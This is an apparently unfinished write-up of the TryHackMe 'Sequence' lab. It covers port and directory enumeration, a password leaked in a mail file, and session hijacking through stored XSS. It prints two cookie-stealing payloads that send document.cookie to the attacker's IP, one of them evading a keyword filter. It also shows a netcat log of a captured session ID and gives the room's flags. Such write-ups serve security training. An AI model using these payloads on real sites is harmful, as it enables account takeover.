# TryHackMe: 

**Difficulty:** Hard
**Operating System:** Linux
**Attacker IP:** 192.168.180.79
**Machine IP:** 10.113.174.117
**Domain:** review.thm
**Room Link:** https://tryhackme.com/room/sequence

---

## 1. Reconnaissance

Initial machine scanning to identify open ports and running services.

```bash
# Nmap Scan
nmap --privileged -p- -sV -sC -T4 -v -oN nmap_pelen_skan.txt 10.113.174.117
```
"",
" **Full Nmap scan log:** [nmap_pelen_skan.txt](./nmap_pelen_skan.txt)",
"",
**Full Nmap scan log:** [nmap_pelen_skan.txt](./nmap_pelen_skan.txt)

**Key Findings:**
* **Port 22 (SSH):** OpenSSH 8.2p1 Ubuntu 4ubuntu0.3
* **Port 80 (HTTP):** Apache httpd 2.4.41

## 2. Enumeration

Detailed analysis of open services. For the web server, I ran a hidden directory scan:

```bash
# Directory Brute-forcing
gobuster dir -u 10.113.174.117 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40 -x php,txt,bak,tar.gz -o gobuster_wyniki.txt -b 404,400
```
**Full Gobuster results:** [gobuster_wyniki.txt](./gobuster_wyniki.txt)
**Interesting Paths / Vulnerabilities Found:**
```
index.php            (Status: 200) [Size: 1694]
contact.php          (Status: 200) [Size: 2246]
login.php            (Status: 200) [Size: 1944]
uploads              (Status: 301) [Size: 318] [--> http://10.114.179.101/uploads/]
header.php           (Status: 200) [Size: 1400]
mail                 (Status: 301) [Size: 315] [--> http://10.114.179.101/mail/]
chat.php             (Status: 302) [Size: 0] [--> login.php]
db.php               (Status: 200) [Size: 0]
javascript           (Status: 301) [Size: 321] [--> http://10.114.179.101/javascript/]
settings.php         (Status: 302) [Size: 0] [--> login.php]
dashboard.php        (Status: 302) [Size: 1400] [--> login.php]
phpmyadmin           (Status: 301) [Size: 321] [--> http://10.114.179.101/phpmyadmin/]
```
## 3. Initial Access

Checked out normal usage of website. Login is classical, contact - XSS may be viable for 3rd party person to launch it.  
/mail sub had something nice for us, a txt file:
```
From: software@review.thm
To: product@review.thm
Subject: Update on Code and Feature Deployment

Hi Team,

I have successfully updated the code. The Lottery and Finance panels have also been created.

Both features have been placed in a controlled environment to prevent unauthorized access. The Finance panel (`/finance.php`) is hosted on the internal 192.x network, and the Lottery panel (`/lottery.php`) resides on the same segment.

For now, access is protected with a completed 8-character alphanumeric password (S60u}f5j), in order to restrict exposure and safeguard details regarding our potential investors.

I will be away on holiday but will be back soon.

Regards,  
Robert
```
Credentials found in /mail: S60u}f5j (Potential user: robert or software).

Internal Files discovered: /finance.php, /lottery.php.

Potential Architecture: Internal network 192.x (possible Docker environment or SSRF vulnerability).

http://10.113.174.117/phpmyadmin/ in version 4.5.9 - not vulnerable to common attacks.

### XSS
After moving around the website, and finally adding it to hosts as review.thm (havent seen that one)  
I thought ill use XSS via contact.php - in reason of nmap scan and "PHPSESSID: httponly flag not set"  
Vulnerability: Stored Cross-Site Scripting (XSS).  
Payload used: <script>new Image().src='http://<myip>>?c=' + document.cookie;</script>  
Method: Intercepted the PHPSESSID via a local listener and replaced the browser cookie to hijack the active session of the mod user.
**THM{M0dH@ck3dPawned007}**

## 4. Privilege Escalation
As mod we can continue checking out website. We can see settings, in which we can change password, and a place to promote user to an admin. Quick recon with burp - both of them need CSRF token. We can change our own password, we can't promote ourselfs to admin role.  
Next, we have chat. It has some words filtering, but nothing solid.
```
onst dangerous = ["<script>", "</script>", "onerror", "onload", "fetch", "ajax", "xmlhttprequest", "eval", "document.cookie", "window.location"];
```
I have tried to use the same method like previously by chaning payload to go thru filter, and managed to have a connection from admin on listener.
```javascript
<img src=x o&#110;error="this.src='http://192.168.180.79/'+document['coo'+'kie']">
```
So we know that XSS is still viable. Ill try to use XSS request forgery, and make a paylod which makes admin to change its own password, or grants me an admin role - but remember, that it needs CSRF token which we have to steal as well.
But! Its not that easy! HArd to craft something which goes around suspiocious words list, and as well it seems it has a little bit more obfuscation. SO for me only above XSS payload halfly worked, that I had a connection to my listener. I got a little bit furious - You know how it is after several hours of trying and getting to nowhere. So I just send a link to feedback dashboard. ANd... it worked.  
```bash
❯ nc -lvnp 80
listening on [any] 80 ...
connect to [192.168.180.79] from (UNKNOWN) [10.113.174.117] 54096
GET /?c=PHPSESSID=utu69j5dka8m2pn1i3o9caiv3i HTTP/1.1
Host: 192.168.180.79
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Referer: http://review.thm/
Accept-Encoding: gzip, deflate
```
Im kinda sure it wasn't supposed to go this way, it had to do something with CSRF (didn't check if I could figure out a process of creating it), but it worked.
**THM{Adm1NPawned007}**
<details>
  <summary>🚩 Click to see User Flag</summary>
  
  `THM{Adm1NPawned007}`
</details>
### User Flag


### Root Flag (System / Administrator)


## 5. Summary and Lessons Learned

* **What went well:** 
* **What I learned:** 
* **Where I got stuck (Rabbit holes):** 